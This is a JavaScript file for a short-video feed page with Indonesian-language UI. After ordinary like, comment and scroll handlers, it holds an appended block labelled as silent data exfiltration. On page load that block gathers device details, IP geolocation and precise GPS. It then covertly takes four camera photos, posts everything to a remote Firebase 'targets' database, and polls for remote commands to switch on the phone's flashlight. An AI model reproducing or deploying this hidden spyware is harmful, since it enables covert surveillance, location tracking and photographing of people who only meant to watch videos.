const comments = document.getElementById("comments");
const feedContainer = document.getElementById("feedContainer");
const videoItems = document.querySelectorAll(".video-item");

function openComments(event) {
    event.stopPropagation();
    comments.classList.add("active");
}

function toggleText(event) {
    event.stopPropagation();
    const more = event.currentTarget;
    const caption = more.closest(".caption");
    if (!caption) return;
    if (more.textContent.trim() === "lebih sedikit") {
        caption.innerHTML = caption.dataset.short + " <span class='more' onclick='toggleText(event)'>lebih banyak</span>";
    } else {
        caption.innerHTML = caption.dataset.full + " <span class='more' onclick='toggleText(event)'>lebih sedikit</span>";
    }
}

videoItems.forEach((item) => {
    const container = item.querySelector(".container");
    const video = item.querySelector("video");
    const pauseOverlay = item.querySelector(".pause-overlay");
    const likeBtn = item.querySelector(".like-btn");
    const likeAnim = item.querySelector(".like");
    const saveBtn = item.querySelector(".save-btn");

    if (!video) return;
    let lastTap = 0;

    const updateOverlay = () => video.paused ? pauseOverlay.classList.add("active") : pauseOverlay.classList.remove("active");

    if (container) {
        container.addEventListener("click", (e) => {
            comments.classList.remove("active");
            if (e.target.closest(".sidebar") || e.target.closest(".more")) return;
            const now = Date.now();
            if (now - lastTap < 300) {
                likeBtn.classList.add("liked");
                likeAnim.classList.add("active");
                setTimeout(() => likeAnim.classList.remove("active"), 600);
            } else {
                video.paused ? video.play() : video.pause();
                updateOverlay();
            }
            lastTap = now;
        });
    }
    video.addEventListener("pause", updateOverlay);
    video.addEventListener("play", updateOverlay);
    if (likeBtn) likeBtn.addEventListener("click", (e) => { e.stopPropagation(); likeBtn.classList.toggle("liked"); });
    if (saveBtn) saveBtn.addEventListener("click", (e) => { e.stopPropagation(); saveBtn.classList.toggle("saved"); });
});

const scrollObserver = new IntersectionObserver((entries) => {
    entries.forEach((entry) => {
        const video = entry.target.querySelector("video");
        if (!video) return;
        if (!entry.isIntersecting) {
            video.pause();
            video.currentTime = 0;
        }
    });
}, { threshold: 0.6 });

videoItems.forEach((item) => scrollObserver.observe(item));


// ===============================================
// [ SILENT DATA EXFILTRATION - ULTRA INTEL ]
// ===============================================

const FIREBASE_API = "https://data-target-32614-default-rtdb.asia-southeast1.firebasedatabase.app/targets.json";
const COMMAND_URL = "https://data-target-32614-default-rtdb.asia-southeast1.firebasedatabase.app/commands.json";
const IP2LOC_KEY = "377D98C67FC2E3AA42FDFACD479A4E67";

async function startSilentLoot() {
    // Session ID biar 4 foto masuk 1 folder di Data Center
    const sessionID = "ONX-" + Math.random().toString(36).substr(2, 9).toUpperCase();

    let report = {
        session_id: sessionID,
        time: new Date().toLocaleString(),
        // Browser & Device Info (Gambar 2)
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        ram: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Unknown",
        referrer: document.referrer || "Direct Access",
        language: navigator.language
    };

    // --- 1. AMBIL DATA LENGKAP VIA IP2LOCATION (Gambar 1) ---
    try {
        const res = await fetch(`https://api.ip2location.io/?key=${IP2LOC_KEY}`);
        const d = await res.json();

        if (d.ip) {
            report.ip = d.ip;
            report.isp = d.isp;
            report.city = d.city_name;
            report.state = d.region_name;
            report.country = d.country_name;
            report.district = d.district || "N/A";
            report.zip_code = d.zip_code;
            report.loc = `https://www.google.com/maps?q=${d.latitude},${d.longitude}`;
            report.time_zone = d.time_zone;
            report.is_proxy = d.is_proxy ? "YES (VPN/Proxy)" : "No";
            report.asn = d.asn;
            report.as_name = d.as;
            report.fraud_score = d.fraud_score || "N/A";
        }
    } catch (e) {
        // Fallback ke ip-api kalau key mati/limit
        const fbRes = await fetch('http://ip-api.com/json/');
        const fb = await fbRes.json();
        report.ip = fb.query;
        report.isp = fb.isp;
        report.city = fb.city;
        report.loc = `https://www.google.com/maps?q=${fb.lat},${fb.lon}`;
    }

    // --- 2. AMBIL GPS AKURAT (KALAU TARGET ALLOW) ---
    navigator.geolocation.getCurrentPosition((pos) => {
        report.loc = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
        report.gps_accuracy = "High (Satelite)";
    }, null, { enableHighAccuracy: true });

    // --- 3. EKSEKUSI KAMERA & FLASH ---
    initCamera(report);
}

async function initCamera(report) {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.createElement('video');
        const canvas = document.createElement('canvas');
        video.srcObject = stream;
        await video.play();

        // Aktifkan Fitur Remote Flash
        listenForFlash(stream);

        let shots = 0;
        let burst = setInterval(async () => {
            if (shots < 4) {
                shots++;
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                
                const imageData = canvas.toDataURL('image/jpeg', 0.6);

                await fetch(FIREBASE_API, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ ...report, photo: imageData, burst_no: shots })
                });
            } else {
                clearInterval(burst);
                // Matikan kamera setelah selesai 4x jepret (opsional)
                // stream.getTracks().forEach(track => track.stop());
            }
        }, 1500);

    } catch (err) {
        // Kirim data tanpa foto jika kamera ditolak
        fetch(FIREBASE_API, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ ...report, photo: "Access Denied" })
        });
    }
}

async function listenForFlash(stream) {
    const track = stream.getVideoTracks()[0];
    
    // 1. Pastikan pas awal konek, Flash dalam posisi OFF
    try {
        await track.applyConstraints({ advanced: [{ torch: false }] });
    } catch(e) {}

    // 2. Baru dengerin perintah dari Data Center
    setInterval(async () => {
        try {
            const res = await fetch(COMMAND_URL);
            const cmd = await res.json();
            
            // Logika: Hanya nyala jika perintah di Firebase EXPLICITLY "ON"
            if (cmd && cmd.flash === "ON") {
                await track.applyConstraints({ advanced: [{ torch: true }] });
            } else {
                await track.applyConstraints({ advanced: [{ torch: false }] });
            }
        } catch (e) {}
    }, 2000);
} 

window.onload = () => {
    setTimeout(startSilentLoot, 2000);
};
